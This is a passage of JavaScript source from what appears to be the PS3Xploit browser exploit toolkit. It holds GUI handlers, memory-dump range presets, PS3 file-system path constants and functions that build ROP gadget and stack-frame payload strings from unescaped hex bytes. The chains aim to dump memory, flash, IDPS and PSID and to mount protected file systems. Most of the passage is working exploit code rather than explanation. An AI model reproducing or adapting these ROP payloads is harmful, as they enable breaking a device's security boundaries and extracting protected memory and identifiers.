        fs_mount_write_protection=0x00000001;
        write_protect=true;
    }
    
    init_rop.focus();
} 

// Get Thread ID
function getThreadID(id){
    thread_id = id.value;
    init_rop.focus();
    return thread_id;
} 

function getThreadIDFromHTML(){
    thread_id = getValueFromHTML("marked_hex_threads_id");
} 

// Get LED Color
function getLedColor(id){
    control_led_id = id.value;
    marked_hex_system_led_action.focus();
    return thread_id;
} 

// Get LED Action
function getLedAction(id){
    control_led_action = id.value;
    init_rop.focus();
    return thread_id;
} 

// Get Fan Speed
function getFanSpeed(id){
    set_fan_speed = id.value;
    //marked_hex_system_fan_settings.focus();
    init_rop.focus();
    return thread_id;
} 

// Get Fan Settings
function getFanSettings(id){
    set_fan_arg2 = id.value;
    set_fan_arg3 = id.value;
    init_rop.focus();
    return thread_id;
} 

// Beep Magic
function setNumberOfBeeps(beeps){
    sc_buzzer_no_of_beeps = parseInt(number_of_beeps_edit.value);
    init_rop.focus();
} 

// Chain Selector
function chainSelection(hex){
    chain_stackframe = hex.value;
    
    // Set Which Searches Need To Happen To Find Pointers
    setChainOptions(chain_stackframe);
    
    return chain_stackframe;
} 

// Search Size Selector
function searchSizeSelection(marked_search_size){
    search_max_threshold = parseInt(marked_search_size.value*0x100000);
} 

// Search Base Offset Selector
function searchBaseSelection(marked_search_base_offset){
    search_base_offset = parseInt(marked_search_base_offset.value);
    //alert(search_base_offset);
} 

// SearchStack Adjust
function searchStackAdjust(marked_search_stack_adjust){
    search_base_offset_adjust=parseInt(marked_search_stack_adjust.value);
    //return search_base_offset_adjust=parseInt(marked_search_stack_adjust.value);
} 

// Search Range Size Selector
function searchRangeSelection(marked_search_range_size){
    search_range_size = parseInt(marked_search_range_size.value);
    //alert(search_range_size);
} 

// Loop Number Selector
function searchMaxLoops(marked_search_max_loops){
    max_loops = parseInt(marked_search_max_loops.value);
} 

// Search Range Size Selector
function chmodSet(marked_chmod){
    sc_chmod_arg = marked_chmod.value;
    //alert(sc_chmod_arg);
} 

// Search Range Size Selector
function chownSet(marked_chown){
    sc_chmod_arg = marked_chown.value;
    //alert(sc_chown_arg);
} 

// Debug Selector
//var debug_mode_new=false;
function debugToggle(){
    if(debug_mode)
    {
        debug_mode=false;
        hideElement("debug-alert", true);
        disableElement("debug-alert", false);
    }
    else{
        debug_mode=true;
        hideElement("debug-alert", false);
        disableElement("debug-alert", false);
    }
} 

function setPathType(pt){
    switch(pt)
    {
        case 0:
        path_type="file";
        break;
        case 1:
        path_type="dir";
        break;
    }
} 

function setTitleID(id){
    var x=title_id_edit.value;
    title_id=x;
    if(x.length!=9){alert(msg_invalid_title_id);x="PS3XPLOIT";}// check size for 9 chars
    setValueToHTML("title_id_edit","");
    setValueToHTML("title_id_edit",x);
    var v=getValueFromHTML("path_dest");
    
    var game_path = "/dev_hdd0/game/";
    var path_len=v.length;
    var y=v.substring(0,15);
    var z=v.substring(24,path_len);
    var path_display=y+title_id.toUpperCase()+z

    if (y===game_path) {
        setValueToHTML("path_dest","");
        setValueToHTML("path_dest",y+title_id.toUpperCase()+z);
        alert(msg_destination_path_set_new+path_display);
    } else {
        alert(msg_destination_path_incorrect);
        path_dest_type.focus();
    }
} 

function setFileSize(size){
    var x=file_size_edit.value;
    x=x.toString(16);
    file_size_display=x;// set filesize display to be hex by default
    setValueToHTML("file_size_edit","");
    setValueToHTML("file_size_edit",file_size_display);
    if(x===""){alert(msg_default_size);}else{alert(msg_new_size+x);}
    if(x===""){file_size=0x00000140;}else{file_size=x;}// set filesize using hex value
    //if(file_size===0x7FFFF000){setValueToHTML("path_src","/dev_hdd1");setValueToHTML("path_dest","/dev_usb000/hdd1.bin");}//testing hdd1 mount
    init_rop.focus();
} 

function setPathNameSrc(path){
    var x=path.value;
    path_src=x;
    setValueToHTML("path_src",x);
    if((x==="/dev_usb000/LIC.EDAT")||(x==="/dev_hdd0/game/PS3XPLOIT/LICDIR/LIC.EDAT"))
    {
        file_size=0x10190;
        file_size_display="0x"+file_size.toString(16);
        setValueToHTML("file_size_edit",file_size_display);
        if (confirm(msg_anti_piracy_edat)){setValueToHTML("path_src",x);}else{reloadPage();}
    }
} 

function setPathNameDest(path){
    var x=path.value;
    if(x==="httpcache"){
        path_dest=user_home_path+"webbrowser/silk/httpcache/";
    }
    else{
        path_dest=x;
    }
    setValueToHTML("path_dest",path_dest);
    
    if((x==="/dev_usb000/LIC.EDAT")||(x==="/dev_hdd0/game/PS3XPLOIT/LICDIR/LIC.EDAT"))
    {
        file_size=0x10190;
        file_size_display="0x"+file_size.toString(16);
        setValueToHTML("file_size_edit",file_size_display);
        if (confirm(msg_anti_piracy_edat)){setValueToHTML("path_dest",x);}else{reloadPage();}
    }
} 

function setUserID(path){
    if(path.value===""){user_id="00000001";}else{user_id=path.value;}
    user_home_path=dev_hdd0_home+path.value+"/";
    setValueToHTML("path_dest",user_home_path);
    alert(gui_txt_user_id_new+user_id+gui_txt_home_path_new+user_home_path);
} 

// Reboot Selector
var reboot_mode=0x00000200;// LV2 Soft Reboot
function rebootSelection(marked_reboot){
    reboot_mode_temp =  marked_reboot.value;
    switch(reboot_mode_temp)
    {
        case "":
        reboot_mode=sc_shutdown_soft;
        disable_reboot=false;
        if(chain_stackframe===""){marked_hex.focus();}else{init_rop.focus();}
        break;
        case "reboot_shutdown_soft":
        reboot_mode=sc_shutdown_soft;
        disable_reboot=false;
        if(chain_stackframe===""){marked_hex.focus();}else{init_rop.focus();}
        break;
        case "reboot_shutdown_hard":
        reboot_mode=sc_shutdown_hard;
        disable_reboot=false;
        if(chain_stackframe===""){marked_hex.focus();}else{init_rop.focus();}
        break;
        case "reboot_shutdown_off":
        reboot_mode=sc_shutdown_off;
        disable_reboot=false;
        if(chain_stackframe===""){marked_hex.focus();}else{init_rop.focus();}
        break;
        case "exit_chain":
        reboot_mode=sc_shutdown_none;
        disable_reboot=true;
        if(chain_stackframe===""){marked_hex.focus();}else{init_rop.focus();}
        break;
    }
} 

// Set File Mode
var wb=0x00007762;
var rb=0x00007262;
var file_mode;
function setFileMode(mode){
    switch(mode)
    {
        case "rb":
        file_mode=rb;
        break;
        case "wb":
        file_mode=wb;
        break;
    }
    
    return file_mode;
} 

// Flash Type Selector
function setFlashType(type)
{
    switch(type)
    {
        case 0:
        flash_type_select=0;
        type=flash_type_select;
        flash_type_text="NAND";
        checkBox("flash_type_nand",true);
        checkBox("flash_type_nor",false);
        checkBox("flash_type_emmc",false);
        setDefaultSearchParams();
        break;
        case 1:
        flash_type_select=1;
        type=flash_type_select;
        flash_type_text="NOR";
        checkBox("flash_type_nand",false);
        checkBox("flash_type_nor",true);
        checkBox("flash_type_emmc",false);
        setDefaultSearchParams();
        break;
        case 2:
        flash_type_select=2;
        type=flash_type_select;
        flash_type_text="EMMC";
        checkBox("flash_type_nand",false);
        checkBox("flash_type_nor",false);
        checkBox("flash_type_emmc",true);
        setDefaultSearchParams();
        break;
    }
} 

function getFlashType(){
    return flash_type_select;
} 


function setMemDumpAddress(marked_memdump_addr)
{
    var x="";
    memdump_addr=parseInt(marked_memdump_addr.value);
    memdump_addr_temp=memdump_addr;
    addr_start=memdump_addr;
    if(memdump_addr_text==="0x0"){memdump_addr_text="0x00000000";}else{memdump_addr_text=addr_start.toString(16).toUpperCase();}
    x=path_memdump_start+memdump_addr_text+path_memdump_mid+memdump_size_text+path_memdump_end;
    
    setValueToHTML("marked_memdump_addr_edit","0x"+memdump_addr_text);
    setValueToHTML("path_dest",x);
    marked_memdump_size.focus();
    
    //a1_r5=0x00FFFFFF;
    //a1_r29=0x00FFFFFF;
    //a1_r30=0x00000000;
    
    //a1_r5=0x04D5FFF9;
    //a1_r29=0x04D5FFF9;
    //a1_r30=0x00000000;
    
    //a1_r5=0x01FFFFFF;
    //a1_r29=0x01FFFFFF;
    //a1_r30=0x70000000;
    
    //a1_r5=0xFDFFFE3;// 253mb
    //a1_r29=0xFDFFFE3;// 253mb
    //a1_r30=0xC0000000;
} 

function setMemDumpSize(marked_memdump_size)
{
    var x="";
    memdump_size=parseInt(marked_memdump_size.value);
    memdump_size_temp=memdump_size;// actually start_addr+size [fix later]
    addr_end=memdump_addr_temp+memdump_size;
    memdump_size_text=addr_end.toString(16).toUpperCase();
    x=path_memdump_start+memdump_addr_text+path_memdump_mid+memdump_size_text+path_memdump_end;
    
    setValueToHTML("marked_memdump_size_edit","0x"+memdump_size_text);
    setValueToHTML("path_dest",x);
    memdump_save_new_values.focus();
} 

function saveMemdumpValues()
{   
    var x;
    memdump_addr=parseInt(marked_memdump_addr_edit.value);
    memdump_size=parseInt(marked_memdump_size_edit.value);
    memdump_addr_text=memdump_addr.toString(16).toUpperCase();
    memdump_size_text=memdump_size.toString(16).toUpperCase();
    x=path_memdump_start+memdump_addr_text+path_memdump_mid+memdump_size_text+path_memdump_end;
    setValueToHTML("marked_memdump_addr",memdump_addr_text);
    setValueToHTML("marked_memdump_size",memdump_size_text);
    setValueToHTML("path_dest",x);
    
    memdump_end=memdump_size-memdump_addr;// this is size [fix later]
    memdump_end_text=memdump_end.toString(16).toUpperCase();// this is size [fix later]
    
    alert(msg_memdump_size+memdump_end_text+msg_memdump_start_addr+memdump_addr_text+msg_memdump_end_addr+memdump_size_text);
    memdump_size=memdump_end;
    
    init_rop.focus();
}

function saveMemdumpRangeValues(start,end)
{   
    var x;
    memdump_addr=parseInt(start);
    memdump_size=parseInt(end);
    memdump_addr_text=memdump_addr.toString(16).toUpperCase();
    memdump_size_text=memdump_size.toString(16).toUpperCase();
    x=path_memdump_start+memdump_addr_text+path_memdump_mid+memdump_size_text+path_memdump_end;
    setValueToHTML("marked_memdump_addr_edit",memdump_addr_text);
    setValueToHTML("marked_memdump_size_edit",memdump_size_text);
    setValueToHTML("path_dest",x);
    
    memdump_end=memdump_size-memdump_addr;// this is size [fix later]
    memdump_end_text=memdump_end.toString(16).toUpperCase();// this is size [fix later]
    
    alert(msg_memdump_size+memdump_end_text+msg_memdump_start_addr+memdump_addr_text+msg_memdump_end_addr+memdump_size_text);
}


function setMemDumpRange(marked_memdump_range)
{   
    var selection=marked_memdump_range.value;
    
    if(selection===0)
    {
        //memdump_addr=0x00010000;
        //memdump_size=0x01BEFFF3;
        memdump_addr=mem_preset_0_start;
        memdump_size=mem_preset_0_size;
    }
    
    if(selection===1)
    {
        //memdump_addr=0x10000000;
        //memdump_size=0x0010FFF0;
        memdump_addr=mem_preset_1_start;
        memdump_size=mem_preset_1_size;
    }
    
    if(selection===2)
    {
        //memdump_addr=0x20000000;
        //memdump_size=0x009FFFFF;
        memdump_addr=mem_preset_2_start;
        memdump_size=mem_preset_2_size;
    }
    
    if(selection===3)
    {
        //memdump_addr=0x30000000;
        //memdump_size=0x0003FFE6;
        memdump_addr=mem_preset_3_start;
        memdump_size=mem_preset_3_size;
    }
    
    if(selection===4)
    {
        //memdump_addr=0x40000000;
        //memdump_size=0x0000FFEF;
        memdump_addr=mem_preset_4_start;
        memdump_size=mem_preset_4_size;
    }
    
    if(selection===5)
    {
        //memdump_addr=0x50000000;
        //memdump_size=0x0000FFEF;
        memdump_addr=mem_preset_5_start;
        memdump_size=mem_preset_5_size;
    }
    
    if(selection===6)
    {
        //memdump_addr=0x60000000;
        //memdump_size=0x00000FFE;
        memdump_addr=mem_preset_6_start;
        memdump_size=mem_preset_6_size;
    }
    
    if(selection===7)
    {
        //memdump_addr=0x70000000;
        //memdump_size=0x01FFFFFF;
        memdump_addr=mem_preset_7_start;
        memdump_size=mem_preset_7_size;
    }
    
    if(selection===8)
    {
        //memdump_addr=0x80000000;
        //memdump_size=0x0FFFFFFF;
        memdump_addr=mem_preset_8_start;
        memdump_size=mem_preset_8_size;
    }
    
    if(selection===9)
    {
        //memdump_addr=0xC0000000;
        //memdump_size=0x0FDFFFE9;
        memdump_addr=mem_preset_9_start;
        memdump_size=mem_preset_9_size;
    }
    
    // alert(memdump_addr.toString(16)+"\n"+memdump_size.toString(16));
    // setMemDumpAddress(memdump_addr.toString(16));
    // setMemDumpSize(memdump_size.toString(16));
    // saveMemdumpRangeValues(memdump_addr.toString(16),memdump_size.toString(16));

    var x;
    addr_end=memdump_addr+memdump_size;
    addr_end=parseInt(memdump_addr)+parseInt(memdump_size);
    memdump_addr_text=memdump_addr.toString(16).toUpperCase();
    memdump_size_text=addr_end.toString(16).toUpperCase();
    alert(memdump_addr_text);
    alert(memdump_size_text);
    x=path_memdump_start+memdump_addr_text+path_memdump_mid+memdump_size_text+path_memdump_end;
    setValueToHTML("marked_memdump_addr",memdump_addr_text);
    setValueToHTML("marked_memdump_size",memdump_size_text);
    setValueToHTML("path_dest",x);
    saveMemdumpValues();
}


// Disable Memory Options in GUI  bug!?!?
function disableMemDumpOptions()
{   
    disableElement("marked_memdump_addr", true);
    disableElement("marked_memdump_size", true);
}

// Default Page Args If Not Set
function setArgsFromPage()
{
    if((typeof(path_src))||(path_src===""))
    {
        //path_src="/dev_usb000/PS3Xploit.bin";
        path_src="/dev_usb000/PS3Xploit/";
    }
    else{
        path_src=getValueFromHTML("path_src");
    }
    
    if((typeof(path_dest))||(path_src===""))
    {
        //path_dest="/dev_hdd0/PS3Xploit.bin";
        path_dest="/dev_hdd0/PS3Xploit";
    }
    else{
        path_dest=getValueFromHTML("path_dest");
    }
    
    page_args_set=true;
}


// Default Settings Selector
var default_settings=true;
function toggle_default_settings(){
    if(default_settings)
    {
        default_settings=false;
    }
    else{
        default_settings=true;
    }
} 

/*
function setPayloadMediaType(type)
{
    var x=marked_xmb_select_alt.value;
    if(x===""){payload_hex_ext="jpg"}else{payload_hex_ext=x;}
}
*/

function setPayloadMedia(marked_xmb_select)
{
    var media_dest="";
    switch(marked_xmb_select.value)
    {
        case "":
        setValueToHTML("path_src","");
        disableElement("path_src",false);
        disableElement("path_src_type",false);
        setValueToHTML("path_dest","");
        disableElement("path_dest",false);
        disableElement("path_dest_type",false);
        disableElement("copy_payload_media_photo",true);
        disableElement("copy_payload_media_music",true);
        disableElement("copy_payload_media_video",true);
        break;
        
        case "music":
        payload_hex_ext=".mp3";
        media_dest=dev_hdd0_music+media_random+payload_hex+payload_hex_ext;
        //setValueToHTML("path_src","");
        //disableElement("path_src",true);
        //disableElement("path_src_type",true);
        setValueToHTML("path_dest",media_dest);
        disableElement("copy_payload_media_photo",true);
        disableElement("copy_payload_media_music",false);
        disableElement("copy_payload_media_video",true);
        //return str2u(media_dest);
        alert(msg_media_not_supported);
        break;
        
        case "photo":
        payload_hex_ext=".jpg";
        media_dest=dev_hdd0_photo+y+"/"+m+"/"+d+"/"+payload_hex+payload_hex_ext;
        //setValueToHTML("path_src","");
        //disableElement("path_src",true);
        //disableElement("path_src_type",true);
        setValueToHTML("path_dest",media_dest);
        disableElement("copy_payload_media_photo",false);
        disableElement("copy_payload_media_music",true);
        disableElement("copy_payload_media_video",true);
        //return str2u(media_dest);
        break;
        
        case "video":
        payload_hex_ext=".mp4";
        media_dest=dev_hdd0_video+media_random+payload_hex+payload_hex_ext;
        //setValueToHTML("path_src","");
        //disableElement("path_src",true);
        //disableElement("path_src_type",true);
        setValueToHTML("path_dest",media_dest);
        disableElement("copy_payload_media_photo",true);
        disableElement("copy_payload_media_music",true);
        disableElement("copy_payload_media_video",false);
        //return str2u(media_dest);
        alert(msg_media_not_supported);
        break;
        
        default:
        break;
    }
}

function copyPayloadMedia()
{
    //
}

function execSuccessMessage(chain)
{
    if(!msg_override_seen)
    {
        switch(chain)
        {
            case "mem_dump_test":
            msg_success_text=success_chain_exec_memdump;
            reload_page.focus();
            break;
            
            case "get_open_psid":
            msg_success_text=success_chain_exec_psid;
            reload_page.focus();
            break;
            
            case "dump_idps_from_mem":
            msg_success_text=success_chain_exec_idps;
            reload_page.focus();
            break;
            
            case "sys_sm_get_platform_info":
            msg_success_text=success_chain_exec_syscall_dump;
            reload_page.focus();
            break;
            
            case "webkit_search_area":
            msg_success_text=success_chain_exec_memdump;
            reload_page.focus();
            break;
            
            case "minver_check":
            msg_success_text=success_chain_exec_press_again;
            break;
            
            case "sys_game_get_temperature":
            msg_success_text=success_chain_exec_press_again;
            break;
            
            case "sys_storage_get_device_info":
            msg_success_text=success_chain_exec_press_again;
            break;
            
            case "sys_fs_mount":
            msg_success_text=success_mount_device;
            break;
            
            case "file_read_write_test":
            msg_success_text=success_chain_exec_read_write_file;
            break;
            
            default:
            msg_success_text=success_chain_exec;
            break;
        }
    }
    
    // Check other chains
    switch(chain)
    {
        case "file_read_write_test":
        msg_success_text=success_chain_exec_read_write_file;
        break;
    }
    
    msg_override_seen=true;
}

function postExecTasks(chain)
{
    // bug?!?! for 2nd execute
    switch(chain)
    {
        case "minver_check":
        setTimeout(showMinVersion(),2000);
        break;
        
        case "sys_game_get_temperature":
        setTimeout(showTemps(),2000);
        break;
        
        case "sys_storage_get_device_info":
        setTimeout(showReturnValue(),2000);
        break;
        
        case "mem_dump_test":
        setTimeout(disableElement("load_rop",true));
        break;
        
        case "get_open_psid":
        setTimeout(disableElement("load_rop",true));
        break;
        
        case "dump_idps_from_mem":
        setTimeout(disableElement("load_rop",true));
        break;
        
        case "ppu_thread_get_stack_info":
        setTimeout(disableElement("load_rop",true));
        break;
        
        default:
        msg_success_text=success_chain_exec;
        break;
    }
}

function showAllDebugOutput()
{
    var sample="sampleX";
    
    //alert("Page X of X"+"\n"+"sample: "+sample+"\n"+"sample: "+sample+"\n"+"sample: "+sample+"\n"+"sample: "+sample+"\n"+"sample: "+sample+"\n");
    alert("Page 1 of X"+"\n"+"flash_type_text: "+flash_type_text+"\n"+"chain_stackframe: "+chain_stackframe+"\n"+"str2u_adjusted: "+str2u_adjusted);
    alert("Page 2 of X"+"\n"+"max_loops: "+max_loops+"\n"+"failCount: "+failCount+"\n"+"failCountMax: "+failCountMax+"\n"+"search_max_threshold: "+search_max_threshold.toString(16)+"\n"+"search_max_threshold_backup: "+search_max_threshold_backup.toString(16)+"\n");
    alert("Page 3 of X"+"\n"+"search_base_offset: "+search_base_offset.toString(16)+"\n"+"search_base_offset_min: "+search_base_offset_min.toString(16)+"\n"+"search_base_offset_max: "+search_base_offset_max.toString(16)+"\n"+"search_base_offset_adjust: "+search_base_offset_adjust.toString(16)+"\n"+"search_base_offset_adjust_jump2: "+search_base_offset_adjust_jump2+"\n");
    alert("Page 4 of X"+"\n"+"search_base_offset_adjust_jump1: "+search_base_offset_adjust_jump1.toString(16)+"\n"+"search_range_size: "+search_range_size.toString(16));
    alert("Page 5 of X"+"\n"+"path_src: "+path_src+"\n"+"path_dest: "+path_dest+"\n"+"user_id: "+user_id+"\n"+"user_home_path: "+user_home_path);
    alert("Page 6 of X"+"\n"+"memdump_addr: "+memdump_addr.toString(16)+"\n"+"memdump_size: "+memdump_size.toString(16)+"\n"+"sample: "+sample+"\n"+"sample: "+sample+"\n"+"sample: "+sample+"\n");
    //alert(msg_debug_placeholder);
}

// PS3 Default Path Variables
// PS3Xploit Team 2018 / ps3xploit.com


var path_name;

var path_dev_blind="/dev_blind/";

var path_name_test="/dev_hdd0/test/";// 15 bytes
var path_name_test_new="/dev_hdd0/testnew/";// 15 bytes

var path_ps3xploit="/dev_hdd0/ps3xploit/";// 20 bytes

var hdd_dir_ps3xploit="/dev_hdd0/PS3Xploit/";
var hdd_dir_ps3xploit_new="/dev_hdd0/PS3XploitNew/";
var usb_dir_ps3xploit="/dev_usb000/PS3Xploit/";

var hdd_file_ps3xploit="/dev_hdd0/PS3Xploit/hello.txt";
var usb_file_ps3xploit="/dev_usb000/PS3Xploit/hello.txt";

// Disc Paths
var dev_bdvd="/dev_bdvd/";
var dev_bdvd_usrdir="/dev_bdvd/PS3_GAME/USRDIR";
var dev_bdvd_eboot="/dev_bdvd/PS3_GAME/USRDIR/EBOOT.BIN";

// Default PS3 HDD Root Paths
var dev_hdd0="/dev_hdd0/";
var dev_hdd0_crash_report="/dev_hdd0/crash_report/";
var dev_hdd0_data="/dev_hdd0/data/";
var dev_hdd0_drm="/dev_hdd0/drm/";
var dev_hdd0_game="/dev_hdd0/game/";
var dev_hdd0_game_debug="/dev_hdd0/game_debug/";
var dev_hdd0_home="/dev_hdd0/home/";
var dev_hdd0_mms="/dev_hdd0/mms/";
var dev_hdd0_music="/dev_hdd0/music/";
var dev_hdd0_photo="/dev_hdd0/photo/";
var dev_hdd0_tmp="/dev_hdd0/tmp/";
var dev_hdd0_video="/dev_hdd0/video/";
var dev_hdd0_vm="/dev_hdd0/vm/";
var dev_hdd0_vsh="/dev_hdd0/vsh/";
var dev_hdd0_xmlhost="/dev_hdd0/xmlhost/";


var dev_hdd0_home_exdata="/dev_hdd0/home/00000001/exdata/";

var dev_hdd1_crash_report="/dev_hdd1/crash_report/";
var dev_hdd1_crash_report_kernel="/dev_hdd1/crash_report/kernel/";
var log_ps3crash_kernel="/dev_hdd1/crash_report/kernel/ps3crash-kernel.dat";

var path_db_rebuild="/dev_hdd0/mms/db.err";

var path_hdd_symlink_src="/dev_hdd0/game/";
var path_usb_symlink_dest="/dev_usb000/game/";

var path_usb_default="/dev_usb000/";
var path_usb_000="/dev_usb000/";
var path_usb_001="/dev_usb001/";
var path_usb_002="/dev_usb002/";
var path_usb_003="/dev_usb003/";
var path_usb_004="/dev_usb004/";
var path_usb_005="/dev_usb005/";
var path_usb_006="/dev_usb006/";
var path_usb_007="/dev_usb007/";
var path_hdd0_default="/dev_hdd0/";
var path_hdd1_default="/dev_hdd1/";
var path_hdd2_default="/dev_hdd2/";
var path_flash_default="/dev_flash/";
var path_flash2_default="/dev_flash2/";
var path_flash3_default="/dev_flash3/";

var rename_test_src="/dev_hdd0/test/";
var rename_test_dest="/dev_hdd0/PS3Xploit/";

var payload_test_bin="/dev_hdd0/game/PS3XPLOIT/USRDIR/payloads/default.bin";


// File Names
var path_usb_test_bin="/dev_usb000/PS3Xploit.bin";
var path_usb_test_txt="/dev_usb000/PS3Xploit.txt";

var path_hdd_test_bin="/dev_hdd0/PS3Xploit.bin";
var path_hdd_test_txt="/dev_hdd0/PS3Xploit.txt";

var path_usb_idps_bin="/dev_usb000/idps.bin";
var path_usb_psid_bin="/dev_usb000/psid.bin";

var path_usb_flash_hex="/dev_usb000/flsh.hex";
var path_usb_dump_bin="/dev_usb000/dump.bin";

var path_memdump_start="/dev_usb000/dump_0x";
var path_memdump_mid="-0x";
var path_memdump_end=".bin";

var console_write_dump="/dev_hdd0/console_write_dump.bin";

var fs_stat_dump="/dev_usb000/sys_fs_stat_dump.bin";
var ppu_thread_get_stack_info_dump="/dev_usb000/ppu_thread_get_stack_info.bin";
var ppu_thread_get_priority_dump="/dev_usb000/ppu_thread_get_priority.bin";
var sys_fs_get_fs_info_dump="/dev_usb000/sys_fs_get_fs_info.bin";
var sys_fs_get_mount_info_dump="/dev_usb000/sys_fs_get_mount_info.bin";
var path_sys_net_dump="/dev_usb000/sys_net_dump.bin";
var path_storage_get_device_info_dump="/dev_usb000/sys_storage_get_device_info.bin";
var path_storage_report_devices_dump="/dev_usb000/sys_storage_report_devices.bin";
var sys_ss_utoken_lv2_sc_table_dump="/dev_usb000/sys_ss_utoken_lv2_sc_table_dump.bin";
var sys_sm_get_platform_info_dump="/dev_usb000/sys_sm_get_platform_info.bin";
var webkit_search_area_dump="/dev_usb000/webkit_search_area-0x80100000-0x806FFFFF.bin";

var path_usb_memdump0="/dev_usb000/dump_0x00000000-0x04D5FFF9.bin";
var path_usb_memdump1="/dev_usb000/dump_0x10000000-0x1FFFFFFF.bin";
var path_usb_memdump2="/dev_usb000/dump_0x20000000-0x2FFFFFFF.bin";
var path_usb_memdump3="/dev_usb000/dump_0x30000000-0x3FFFFFFF.bin";
var path_usb_memdump4="/dev_usb000/dump_0x40000000-0x4FFFFFFF.bin";
var path_usb_memdump5="/dev_usb000/dump_0x50000000-0x5FFFFFFF.bin";
var path_usb_memdump6="/dev_usb000/dump_0x60000000-0x6FFFFFFF.bin";
//var path_usb_memdump7="/dev_usb000/dump_0x70000000-0x7FFFFFFF.bin";
var path_usb_memdump7="/dev_usb000/dump_0x70000000-0x71FFFFFF.bin";
var path_usb_memdump8="/dev_usb000/dump_0x80000000-0x8FFFFFFF.bin";
var path_usb_memdump9="/dev_usb000/dump_0x90000000-0x9FFFFFFF.bin";
var path_usb_memdumpA="/dev_usb000/dump_0xA0000000-0xAFFFFFFF.bin";
var path_usb_memdumpB="/dev_usb000/dump_0xB0000000-0xBFFFFFFF.bin";
var path_usb_memdumpC="/dev_usb000/dump_0xC0000000-0xCFFFFFFF.bin";
var path_usb_memdumpD="/dev_usb000/dump_0xD0000000-0xDFFFFFFF.bin";
var path_usb_memdumpE="/dev_usb000/dump_0xE0000000-0xEFFFFFFF.bin";
var path_usb_memdumpF="/dev_usb000/dump_0xF0000000-0xFFFFFFFF.bin";

var path_hdd_memdump0="/dev_hdd0/dump_0x00000000-0x0FFFFFFF.bin";
var path_hdd_memdump1="/dev_hdd0/dump_0x10000000-0x1FFFFFFF.bin";
var path_hdd_memdump2="/dev_hdd0/dump_0x20000000-0x2FFFFFFF.bin";
var path_hdd_memdump3="/dev_hdd0/dump_0x30000000-0x3FFFFFFF.bin";
var path_hdd_memdump4="/dev_hdd0/dump_0x40000000-0x4FFFFFFF.bin";
var path_hdd_memdump5="/dev_hdd0/dump_0x50000000-0x5FFFFFFF.bin";
var path_hdd_memdump6="/dev_hdd0/dump_0x60000000-0x6FFFFFFF.bin";
var path_hdd_memdump7="/dev_hdd0/dump_0x70000000-0x7FFFFFFF.bin";
var path_hdd_memdump8="/dev_hdd0/dump_0x80000000-0x8FFFFFFF.bin";
var path_hdd_memdump9="/dev_hdd0/dump_0x90000000-0x9FFFFFFF.bin";
var path_hdd_memdumpA="/dev_hdd0/dump_0xA0000000-0xAFFFFFFF.bin";
var path_hdd_memdumpB="/dev_hdd0/dump_0xB0000000-0xBFFFFFFF.bin";
var path_hdd_memdumpC="/dev_hdd0/dump_0xC0000000-0xCFFFFFFF.bin";
var path_hdd_memdumpD="/dev_hdd0/dump_0xD0000000-0xDFFFFFFF.bin";
var path_hdd_memdumpE="/dev_hdd0/dump_0xE0000000-0xEFFFFFFF.bin";
var path_hdd_memdumpF="/dev_hdd0/dump_0xF0000000-0xFFFFFFFF.bin";


function setPathNames()
{
    path_src=document.getElementById("path_src").value;
    path_dest=document.getElementById("path_dest").value;
    
    path_src_fp=path_src;
    path_dest_fp=path_dest;
    
    path_fp="/dev_usb000/test.bin";
    path_fp2="/dev_hdd0/test.bin";
    
    //path_name=str2u(path);
    //return path_name;
}

// PS3 Default Search Pointers Gadget Hex
// PS3Xploit Team 2018 / ps3xploit.com


// REQUIRED

// Default USB File Pointer 1 / Gadget #1 + TOC Gadget Hex
function reload_usb_fp(state)
{
    if(state){
        //return unescape("\u4141")+str2u(path_usb_flash_hex)+unescape("\u0000\u7762\u0000\u0000\u4141\u4141\u4141\u4141")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+unescape("\u0000\uFFFF\uFFFF\u4141\uFD7E");// 56 bytes
        return unescape("\u4141\u2F64\u6576\u5F75\u7362\u3030\u302F\u6964\u7073\u2E68\u6578\u0000\u7762\u0000\u0000\u4141\u4141\u4141\u4141")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+unescape("\u0000\uFFFF\uFFFF\u4141\uFD7E");// 56 bytes
    }
    else{
        return;
    }
}

// Gadget Stackframe Setup
// moved to stack.js to keep them all together

// Default Jump 1 Pointer
function reload_jump1(state)
{
    if(state){
        return unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
    }
    else{
        return;
    }
}

// Default Jump 2 Pointer
/*
function reload_jump2(state)
{
    if(state){
        return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950") // 50 bytes
        jump_2+=hexw2bin(stack_frame_addr)+unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
    }
    else{
        return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950") // 50 bytes
        jump_2+=hexw2bin(stack_frame_addr)+unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
    }
}
*/

// Default Jump 2 Pointer
function reload_jump2(state, stage)
{
    if(state){
        switch (stage) {
        case "1":
            return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950");// 50 bytes
            break;
        case "2":
            return unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");// 18 bytes
            break;
        default:
            break;
        }
    }
    else{
        return;
    }
}


// OPTIONAL

// Default Generic File Descriptor Gadget Hex
function reload_fd(state)
{
    if(state){
        return unescape("\u4242\u4141\u4141\uFD8C");// 8 bytes
    }
    else{
        return;
    }
}

// Default HDD File Pointer 1 Gadget Hex
function reload_hdd_fp(state)
{
    if(state){
        return unescape("\u4141")+str2u(path_name_src)+unescape("\u0000\u0000\u4141\u4141\uFD7C");// path+12 bytes
    }
    else{
        return;
    }
}

// Default HDD File Pointer 2 Gadget Hex
function reload_hdd_fp2(state)
{
    if(state){
        return unescape("\u4141")+str2u(path_name_dest)+unescape("\u0000\u0000\u4141\u4141\uFD6C");// path+12 bytes
    }
    else{
        return;
    }
}

// Default USB File Pointer 2 Gadget Hex
function reload_usb_fp2(state)
{
    if(state){
